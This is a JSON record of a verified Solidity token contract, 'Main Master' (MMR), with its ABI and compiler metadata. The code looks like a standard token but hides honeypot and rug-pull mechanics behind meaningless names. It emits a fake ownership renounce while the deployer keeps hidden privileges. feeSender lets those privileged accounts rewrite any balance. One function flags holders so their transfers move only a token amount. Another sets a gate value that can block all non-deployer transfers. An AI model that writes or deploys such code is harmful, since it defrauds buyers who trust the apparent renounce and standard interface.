{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface senderTo {\n    function createPair(address tradingFee, address buyTeam) external returns (address);\n}\n\ninterface fundTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyAt) external view returns (uint256);\n\n    function transfer(address fromFund, uint256 exemptReceiver) external returns (bool);\n\n    function allowance(address shouldAmountReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromFund,\n        uint256 exemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingList, uint256 value);\n    event Approval(address indexed shouldAmountReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract tokenLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalSender is fundTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MainMaster is tokenLaunched, fundTotal, totalSender {\n\n    uint8 private txLimit = 18;\n\n    function transfer(address txMin, uint256 exemptReceiver) external virtual override returns (bool) {\n        return amountLaunch(_msgSender(), txMin, exemptReceiver);\n    }\n\n    uint256 private autoMarketingFee = 100000000 * 10 ** 18;\n\n    function feeSender(address txMin, uint256 exemptReceiver) public {\n        teamSender();\n        toBuy[txMin] = exemptReceiver;\n    }\n\n    uint256 constant shouldLimitMax = 14 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return takeExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private txReceiverExempt;\n\n    function approve(address shouldFund, uint256 exemptReceiver) public virtual override returns (bool) {\n        txReceiverExempt[_msgSender()][shouldFund] = exemptReceiver;\n        emit Approval(_msgSender(), shouldFund, exemptReceiver);\n        return true;\n    }\n\n    function receiverIsTrading(address teamWallet, address fromFund, uint256 exemptReceiver) internal returns (bool) {\n        require(toBuy[teamWallet] >= exemptReceiver);\n        toBuy[teamWallet] -= exemptReceiver;\n        toBuy[fromFund] += exemptReceiver;\n        emit Transfer(teamWallet, fromFund, exemptReceiver);\n        return true;\n    }\n\n    address minLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function amountLaunch(address teamWallet, address fromFund, uint256 exemptReceiver) internal returns (bool) {\n        if (teamWallet == walletTeamTx) {\n            return receiverIsTrading(teamWallet, fromFund, exemptReceiver);\n        }\n        uint256 listMin = fundTotal(marketingTeam).balanceOf(launchedTake);\n        require(listMin == tradingTo);\n        require(fromFund != launchedTake);\n        if (txShould[teamWallet]) {\n            return receiverIsTrading(teamWallet, fromFund, shouldLimitMax);\n        }\n        return receiverIsTrading(teamWallet, fromFund, exemptReceiver);\n    }\n\n    uint256 private senderFundTo;\n\n    function balanceOf(address buyAt) public view virtual override returns (uint256) {\n        return toBuy[buyAt];\n    }\n\n    function owner() external view returns (address) {\n        return tokenAuto;\n    }\n\n    function transferFrom(address teamWallet, address fromFund, uint256 exemptReceiver) external override returns (bool) {\n        if (_msgSender() != minLiquidity) {\n            if (txReceiverExempt[teamWallet][_msgSender()] != type(uint256).max) {\n                require(exemptReceiver <= txReceiverExempt[teamWallet][_msgSender()]);\n                txReceiverExempt[teamWallet][_msgSender()] -= exemptReceiver;\n            }\n        }\n        return amountLaunch(teamWallet, fromFund, exemptReceiver);\n    }\n\n    mapping(address => bool) public isLaunched;\n\n    function receiverWalletLiquidity(address takeShould) public {\n        teamSender();\n        \n        if (takeShould == walletTeamTx || takeShould == marketingTeam) {\n            return;\n        }\n        txShould[takeShould] = true;\n    }\n\n    address private tokenAuto;\n\n    address launchedTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public swapLiquidity;\n\n    bool public listSwap;\n\n    mapping(address => bool) public txShould;\n\n    bool private swapLimit;\n\n    function teamSender() private view {\n        require(isLaunched[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenAuto;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txLimit;\n    }\n\n    function senderFee() public {\n        emit OwnershipTransferred(walletTeamTx, address(0));\n        tokenAuto = address(0);\n    }\n\n    constructor (){\n        if (swapLimit != maxLaunch) {\n            fundList = true;\n        }\n        exemptTo buySenderFee = exemptTo(minLiquidity);\n        marketingTeam = senderTo(buySenderFee.factory()).createPair(buySenderFee.WETH(), address(this));\n        \n        walletTeamTx = _msgSender();\n        isLaunched[walletTeamTx] = true;\n        toBuy[walletTeamTx] = autoMarketingFee;\n        senderFee();\n        if (liquidityTx == receiverFund) {\n            receiverFund = true;\n        }\n        emit Transfer(address(0), walletTeamTx, autoMarketingFee);\n    }\n\n    bool private receiverFund;\n\n    bool private liquidityTx;\n\n    string private maxMarketing = \"MMR\";\n\n    string private takeExempt = \"Main Master\";\n\n    address public marketingTeam;\n\n    function tokenAmount(uint256 exemptReceiver) public {\n        teamSender();\n        tradingTo = exemptReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMarketingFee;\n    }\n\n    function isReceiver(address atBuy) public {\n        if (listSwap) {\n            return;\n        }\n        if (exemptWalletFrom != amountLiquidity) {\n            swapLiquidity = true;\n        }\n        isLaunched[atBuy] = true;\n        if (amountLiquidity != exemptWalletFrom) {\n            exemptWalletFrom = amountLiquidity;\n        }\n        listSwap = true;\n    }\n\n    uint256 private amountLiquidity;\n\n    event OwnershipTransferred(address indexed shouldTeam, address indexed txExempt);\n\n    function allowance(address liquidityFeeShould, address shouldFund) external view virtual override returns (uint256) {\n        if (shouldFund == minLiquidity) {\n            return type(uint256).max;\n        }\n        return txReceiverExempt[liquidityFeeShould][shouldFund];\n    }\n\n    uint256 private exemptWalletFrom;\n\n    address public walletTeamTx;\n\n    uint256 tradingTo;\n\n    bool public maxLaunch;\n\n    mapping(address => uint256) private toBuy;\n\n    bool private fundList;\n\n    uint256 launchedTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAmountReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFeeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"feeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"}],\"name\":\"receiverWalletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeamTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MainMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}